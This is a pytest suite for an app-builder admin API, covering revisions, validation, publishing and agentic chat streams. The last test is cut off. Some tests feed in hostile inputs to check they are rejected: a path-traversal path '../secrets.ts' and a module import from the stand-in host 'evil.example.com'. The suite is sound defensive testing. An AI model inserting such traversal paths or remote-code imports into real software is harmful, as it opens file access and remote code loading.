import json
from uuid import UUID

import pytest
from sqlalchemy import select

from app.api.routers.published_apps_admin import (
    BUILDER_MAX_FILE_BYTES,
    BuilderPatchGenerationResult,
    BuilderPatchOp,
)
from app.db.postgres.models.published_apps import (
    BuilderConversationTurnStatus,
    PublishedApp,
    PublishedAppBuilderConversationTurn,
    PublishedAppRevision,
)

from ._helpers import admin_headers, seed_admin_tenant_and_agent, start_publish_and_wait


def _parse_sse_events(payload: str) -> list[dict]:
    events: list[dict] = []
    for block in payload.split("\n\n"):
        for line in block.splitlines():
            if line.startswith("data: "):
                events.append(json.loads(line[6:]))
    return events


@pytest.mark.asyncio
async def test_builder_state_and_revision_workflow(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_payload = create_resp.json()
    app_id = app_payload["id"]
    assert app_payload["slug"]
    assert app_payload["template_key"] == "chat-classic"

    templates_resp = await client.get("/admin/apps/templates", headers=headers)
    assert templates_resp.status_code == 200
    templates_payload = templates_resp.json()
    assert len(templates_payload) >= 5
    premium_template = next((template for template in templates_payload if template["key"] == "chat-grid"), None)
    assert premium_template is not None
    assert premium_template["name"] == "Layout Shell Premium"

    builder_state = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert builder_state.status_code == 200
    state_payload = builder_state.json()
    assert state_payload["app"]["id"] == app_id
    assert state_payload["current_draft_revision"]["id"]
    assert state_payload["preview_token"]
    draft_revision_id = state_payload["current_draft_revision"]["id"]

    conflict_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": "00000000-0000-0000-0000-000000000001",
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Conflict</div>; }",
                }
            ],
        },
    )
    assert conflict_resp.status_code == 409
    conflict_payload = conflict_resp.json()["detail"]
    assert conflict_payload["code"] == "REVISION_CONFLICT"
    assert conflict_payload["latest_revision_id"] == draft_revision_id

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Updated</div>; }",
                }
            ],
        },
    )
    assert revision_resp.status_code == 200
    revision_payload = revision_resp.json()
    assert revision_payload["source_revision_id"] == draft_revision_id
    assert "Updated" in revision_payload["files"]["src/App.tsx"]

    reset_resp = await client.post(
        f"/admin/apps/{app_id}/builder/template-reset",
        headers=headers,
        json={"template_key": "chat-grid"},
    )
    assert reset_resp.status_code == 200
    reset_payload = reset_resp.json()
    assert reset_payload["template_key"] == "chat-grid"
    assert reset_payload["entry_file"] in reset_payload["files"]
    assert "src/components/layout/LayoutShell.tsx" in reset_payload["files"]
    assert "src/components/layout/ChatPane.tsx" in reset_payload["files"]
    assert "src/components/layout/SourceListPane.tsx" in reset_payload["files"]
    assert "src/components/layout/SourceViewerPane.tsx" in reset_payload["files"]

    _, publish_status = await start_publish_and_wait(client, app_id=app_id, headers=headers)
    assert publish_status["status"] == "succeeded"
    assert publish_status["published_revision_id"]

    app_resp = await client.get(f"/admin/apps/{app_id}", headers=headers)
    assert app_resp.status_code == 200
    published = app_resp.json()
    assert published["status"] == "published"
    assert published["current_published_revision_id"]

    runtime_resp = await client.get(f"/public/apps/{published['slug']}/runtime")
    assert runtime_resp.status_code == 200
    runtime_payload = runtime_resp.json()
    assert runtime_payload["revision_id"] == published["current_published_revision_id"]
    assert runtime_payload["runtime_mode"] == "vite_static"


@pytest.mark.asyncio
async def test_builder_revision_rejects_path_traversal(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Traversal Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "../secrets.ts",
                    "content": "export const leaked = true;",
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"


@pytest.mark.asyncio
async def test_builder_revision_rejects_unsupported_package_import(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Import Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/BadImport.tsx",
                    "content": "import axios from \"axios\";\nexport const x = axios;\n",
                }
            ],
        },
    )
    assert revision_resp.status_code == 422
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("Unsupported package import: axios" in item["message"] for item in detail["diagnostics"])


@pytest.mark.asyncio
async def test_builder_validate_endpoint_returns_compile_diagnostics(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Validate API App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    ok_resp = await client.post(
        f"/admin/apps/{app_id}/builder/validate",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/Note.ts",
                    "content": "export const note = \"ok\";",
                }
            ],
        },
    )
    assert ok_resp.status_code == 200
    ok_payload = ok_resp.json()
    assert ok_payload["ok"] is True
    assert ok_payload["file_count"] >= 1

    bad_resp = await client.post(
        f"/admin/apps/{app_id}/builder/validate",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/Broken.ts",
                    "content": "import x from \"https://evil.example.com/x.js\";\nexport default x;\n",
                }
            ],
        },
    )
    assert bad_resp.status_code == 422
    bad_payload = bad_resp.json()["detail"]
    assert bad_payload["code"] == "BUILDER_COMPILE_FAILED"
    assert any("Network import is not allowed" in item["message"] for item in bad_payload["diagnostics"])


@pytest.mark.asyncio
async def test_builder_validate_accepts_vite_root_lock_and_test_config_files(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Vite Root Files App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    validate_resp = await client.post(
        f"/admin/apps/{app_id}/builder/validate",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "pnpm-lock.yaml",
                    "content": "lockfileVersion: '9.0'\n",
                },
                {
                    "op": "upsert_file",
                    "path": "yarn.lock",
                    "content": "# yarn lockfile v1\n",
                },
                {
                    "op": "upsert_file",
                    "path": "vite.config.mts",
                    "content": "export default { base: './' };\n",
                },
                {
                    "op": "upsert_file",
                    "path": "vitest.config.ts",
                    "content": "export default { test: { environment: 'jsdom' } };\n",
                },
                {
                    "op": "upsert_file",
                    "path": "eslint.config.js",
                    "content": "export default [];\n",
                },
                {
                    "op": "upsert_file",
                    "path": "prettier.config.cjs",
                    "content": "module.exports = {};\n",
                },
                {
                    "op": "upsert_file",
                    "path": ".eslintrc.cjs",
                    "content": "module.exports = {};\n",
                },
                {
                    "op": "upsert_file",
                    "path": "playwright.config.ts",
                    "content": "export default {};\n",
                },
            ],
        },
    )
    assert validate_resp.status_code == 200
    payload = validate_resp.json()
    assert payload["ok"] is True
    assert payload["file_count"] >= 8


@pytest.mark.asyncio
async def test_builder_revision_rejects_oversized_payload(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Oversized Payload App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    too_large = "x" * (BUILDER_MAX_FILE_BYTES + 1)
    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/HugeNote.txt",
                    "content": too_large,
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"
    assert "File exceeds size limit" in detail["message"]


@pytest.mark.asyncio
async def test_builder_revision_rejects_invalid_rename_source(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Rename Guard App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": draft_revision_id,
            "operations": [
                {
                    "op": "rename_file",
                    "from_path": "src/DoesNotExist.tsx",
                    "to_path": "src/NewName.tsx",
                }
            ],
        },
    )
    assert revision_resp.status_code == 400
    detail = revision_resp.json()["detail"]
    assert detail["code"] == "BUILDER_PATCH_POLICY_VIOLATION"
    assert "source does not exist" in detail["message"]


@pytest.mark.asyncio
async def test_builder_chat_stream_returns_rich_event_envelopes(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Stream Envelope App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200

    events = _parse_sse_events(stream_resp.text)
    assert events
    assert any(item.get("event") == "status" for item in events)
    assert any(item.get("event") == "token" for item in events)
    patch_event = next(item for item in events if item.get("event") == "file_changes")
    checkpoint_event = next(item for item in events if item.get("event") == "checkpoint_created")
    done_event = next(item for item in events if item.get("event") == "done")

    assert patch_event["stage"] == "patch_ready"
    assert patch_event["request_id"]
    assert patch_event["data"]["base_revision_id"] == draft_revision_id
    assert isinstance(patch_event["data"]["operations"], list)
    assert checkpoint_event["data"]["revision_id"]

    assert done_event["stage"] == "complete"
    assert done_event["type"] == "done"

    for event in events:
        if event.get("event"):
            assert event.get("request_id")
            assert event.get("stage")


@pytest.mark.asyncio
async def test_builder_chat_stream_persists_conversation_turn_for_replay(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Conversation Persistence App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200
    events = _parse_sse_events(stream_resp.text)
    patch_event = next(item for item in events if item.get("event") == "file_changes")
    request_id = patch_event["request_id"]

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn).where(
            PublishedAppBuilderConversationTurn.request_id == request_id
        )
    )
    assert persisted is not None
    assert str(persisted.published_app_id) == app_id
    assert str(persisted.revision_id) == draft_revision_id
    assert persisted.status == BuilderConversationTurnStatus.succeeded
    assert persisted.user_prompt == "Make the header title bold"
    assert persisted.assistant_summary
    assert isinstance(persisted.patch_operations, list)
    assert persisted.patch_operations
    assert persisted.failure_code is None
    assert persisted.result_revision_id is not None
    checkpoint_type = persisted.checkpoint_type.value if hasattr(persisted.checkpoint_type, "value") else str(persisted.checkpoint_type)
    assert checkpoint_type == "auto_run"

    list_resp = await client.get(f"/admin/apps/{app_id}/builder/conversations?limit=10", headers=headers)
    assert list_resp.status_code == 200
    list_payload = list_resp.json()
    assert isinstance(list_payload, list)
    assert list_payload
    assert list_payload[0]["request_id"] == request_id
    assert list_payload[0]["status"] == "succeeded"


@pytest.mark.asyncio
async def test_builder_chat_stream_persists_failure_turn(client, db_session, monkeypatch):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Builder Conversation Failure App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    def _invalid_patch(_prompt: str, _files: dict[str, str]) -> tuple[list[dict[str, str]], str]:
        return (
            [
                {
                    "op": "upsert_file",
                    "path": "src/Broken.tsx",
                    "content": 'import x from "https://evil.example.com/x.js";\nexport default x;\n',
                }
            ],
            "inject invalid network import",
        )

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._build_builder_patch_from_prompt", _invalid_patch)

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Break the project on purpose",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.failed
    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
    assert any("Network import is not allowed" in item["message"] for item in (persisted.diagnostics or []))


@pytest.mark.asyncio
async def test_builder_revision_build_status_and_retry_endpoints(client, db_session):
    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Build Status App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    build_resp = await client.get(
        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build",
        headers=headers,
    )
    assert build_resp.status_code == 200
    build_payload = build_resp.json()
    assert build_payload["revision_id"] == draft_revision_id
    assert build_payload["build_status"] == "queued"
    assert build_payload["build_seq"] == 1
    assert build_payload["build_error"] is None
    assert build_payload["template_runtime"] == "vite_static"

    retry_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions/{draft_revision_id}/build/retry",
        headers=headers,
        json={},
    )
    assert retry_resp.status_code == 200
    retry_payload = retry_resp.json()
    assert retry_payload["revision_id"] == draft_revision_id
    assert retry_payload["build_status"] == "failed"
    assert retry_payload["build_seq"] == 2
    assert "Build automation is disabled" in (retry_payload["build_error"] or "")


@pytest.mark.asyncio
async def test_builder_revision_worker_build_gate_does_not_block_draft_save_path(client, db_session, monkeypatch):
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")

    async def _unexpected_preflight(_files: dict[str, str]) -> None:
        raise AssertionError("worker preflight should not run for draft save path")

    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_tools._run_worker_build_preflight", _unexpected_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))

    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Worker Gate Revision App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_before = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_before.status_code == 200
    base_revision_id = state_before.json()["current_draft_revision"]["id"]

    revision_resp = await client.post(
        f"/admin/apps/{app_id}/builder/revisions",
        headers=headers,
        json={
            "base_revision_id": base_revision_id,
            "operations": [
                {
                    "op": "upsert_file",
                    "path": "src/App.tsx",
                    "content": "export function App() { return <div>Worker Gate</div>; }",
                }
            ],
        },
    )
    assert revision_resp.status_code == 200
    revision_payload = revision_resp.json()
    assert revision_payload["source_revision_id"] == base_revision_id
    assert "Worker Gate" in revision_payload["files"]["src/App.tsx"]

    state_after = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_after.status_code == 200
    assert state_after.json()["current_draft_revision"]["id"] == revision_payload["id"]


@pytest.mark.asyncio
async def test_builder_chat_stream_worker_build_gate_does_not_block_chat_flow(client, db_session, monkeypatch):
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")

    async def _unexpected_preflight(_files: dict[str, str]) -> None:
        raise AssertionError("worker preflight should not run for chat stream draft updates")

    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_tools._run_worker_build_preflight", _unexpected_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Worker Gate Chat App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Make the header title bold",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200
    events = _parse_sse_events(stream_resp.text)
    assert any(event.get("event") == "done" for event in events)

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.succeeded
    assert persisted.failure_code is None


@pytest.mark.asyncio
async def test_builder_chat_stream_agentic_loop_runs_worker_tools(client, db_session, monkeypatch):
    monkeypatch.setenv("BUILDER_MODEL_PATCH_GENERATION_ENABLED", "1")
    monkeypatch.setenv("BUILDER_AGENTIC_LOOP_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_CHAT_WORKER_PRECHECK_ENABLED", "1")

    async def _fake_model_patch(**_: object) -> BuilderPatchGenerationResult:
        return BuilderPatchGenerationResult(
            operations=[
                BuilderPatchOp(
                    op="upsert_file",
                    path="src/App.tsx",
                    content="export function App() { return <div>Agentic Worker Tool</div>; }",
                )
            ],
            summary="updated app copy",
            rationale="exercise worker tools in-loop",
            assumptions=[],
        )

    async def _ok_preflight(_files: dict[str, str], *, include_dist_manifest: bool = False):
        if include_dist_manifest:
            return {
                "entry_html": "index.html",
                "assets": [
                    {
                        "path": "index.html",
                        "size": 128,
                        "sha256": "abc123",
                        "content_type": "text/html",
                    }
                ],
            }
        return None

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_tools._run_worker_build_preflight", _ok_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Agentic Worker Tools App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Update the hero copy",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200
    events = _parse_sse_events(stream_resp.text)
    tool_events = [event for event in events if event.get("event") in {"tool_completed", "tool_failed"}]

    build_event = next(item for item in tool_events if item.get("data", {}).get("tool") == "build_project_worker")
    assert build_event["stage"] == "worker_build"
    assert build_event["data"]["status"] == "ok"
    assert build_event["data"]["result"]["status"] == "succeeded"


@pytest.mark.asyncio
async def test_builder_chat_stream_agentic_loop_surfaces_worker_tool_failure(client, db_session, monkeypatch):
    monkeypatch.setenv("BUILDER_MODEL_PATCH_GENERATION_ENABLED", "1")
    monkeypatch.setenv("BUILDER_AGENTIC_LOOP_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_WORKER_BUILD_GATE_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_CHAT_WORKER_PRECHECK_ENABLED", "1")

    async def _fake_model_patch(**_: object) -> BuilderPatchGenerationResult:
        return BuilderPatchGenerationResult(
            operations=[
                BuilderPatchOp(
                    op="upsert_file",
                    path="src/App.tsx",
                    content="export function App() { return <div>Broken Worker Build</div>; }",
                )
            ],
            summary="updated app copy",
            rationale="trigger worker build failure",
            assumptions=[],
        )

    async def _failing_preflight(_files: dict[str, str], *, include_dist_manifest: bool = False):
        raise RuntimeError("`npm run build` failed with exit code 1")

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_tools._run_worker_build_preflight", _failing_preflight)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Agentic Worker Failure App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Update the hero copy",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 422
    detail = stream_resp.json()["detail"]
    assert detail["code"] == "BUILDER_COMPILE_FAILED"
    assert any("npm run build" in item["message"] for item in detail["diagnostics"])

    persisted = await db_session.scalar(
        select(PublishedAppBuilderConversationTurn)
        .where(PublishedAppBuilderConversationTurn.published_app_id == UUID(app_id))
        .order_by(PublishedAppBuilderConversationTurn.created_at.desc())
    )
    assert persisted is not None
    assert persisted.status == BuilderConversationTurnStatus.failed
    assert persisted.failure_code == "BUILDER_COMPILE_FAILED"
    assert any(
        item.get("event") == "tool_failed"
        and item.get("data", {}).get("tool") == "build_project_worker"
        for item in (persisted.tool_trace or [])
    )


@pytest.mark.asyncio
async def test_builder_chat_stream_agentic_loop_reads_prompt_mentioned_file(client, db_session, monkeypatch):
    monkeypatch.setenv("BUILDER_MODEL_PATCH_GENERATION_ENABLED", "1")
    monkeypatch.setenv("BUILDER_AGENTIC_LOOP_ENABLED", "1")

    async def _fake_model_patch(**_: object) -> BuilderPatchGenerationResult:
        return BuilderPatchGenerationResult(
            operations=[
                BuilderPatchOp(
                    op="upsert_file",
                    path="src/App.tsx",
                    content="export function App() { return <div>Prompt mention</div>; }",
                )
            ],
            summary="updated app copy",
            rationale="confirm @file focus read",
            assumptions=[],
        )

    monkeypatch.setattr("app.api.routers.published_apps_admin_routes_chat._generate_builder_patch_with_model", _fake_model_patch)
    monkeypatch.setattr("app.api.routers.published_apps_admin_builder_agentic._generate_builder_patch_with_model", _fake_model_patch)

    tenant, user, org_unit, agent = await seed_admin_tenant_and_agent(db_session)
    headers = admin_headers(str(user.id), str(tenant.id), str(org_unit.id))
    create_resp = await client.post(
        "/admin/apps",
        headers=headers,
        json={
            "name": "Agentic Mention Read App",
            "agent_id": str(agent.id),
            "template_key": "chat-classic",
            "auth_enabled": True,
            "auth_providers": ["password"],
        },
    )
    assert create_resp.status_code == 200
    app_id = create_resp.json()["id"]

    state_resp = await client.get(f"/admin/apps/{app_id}/builder/state", headers=headers)
    assert state_resp.status_code == 200
    draft_revision_id = state_resp.json()["current_draft_revision"]["id"]

    stream_resp = await client.post(
        f"/admin/apps/{app_id}/builder/chat/stream",
        headers=headers,
        json={
            "input": "Update colors in @src/theme.ts and keep style consistent",
            "base_revision_id": draft_revision_id,
        },
    )
    assert stream_resp.status_code == 200
    events = _parse_sse_events(stream_resp.text)
    tool_events = [event for event in events if event.get("event") in {"tool_completed", "tool_failed"}]

    assert any(
        item.get("data", {}).get("tool") == "read_file"
        and item.get("data", {}).get("result", {}).get("path") == "src/theme.ts"
        for item in tool_events
    )


@pytest.mark.asyncio
async def test_builder_chat_stream_agentic_loop_blocks_on_targeted_test_failure(client, db_session, monkeypatch):
    monkeypatch.setenv("BUILDER_MODEL_PATCH_GENERATION_ENABLED", "1")
    monkeypatch.setenv("BUILDER_AGENTIC_LOOP_ENABLED", "1")
    monkeypatch.setenv("APPS_BUILDER_TARGETED_TESTS_ENABLED", "1")

    async def _fake_model_patch(**_: object) -> BuilderPatchGenerationResult:
        return BuilderPatchGenerationResult(
            operations=[
                BuilderPatchOp(
                    op="upsert_file",
                    path="src/App.tsx",
                    content="export function App() { return <div>Targeted Test Failure</div>; }",
                )
            ],
            summary="updated app copy",
            rationale="force targeted test gate failure",
            assumptions=[],
        )

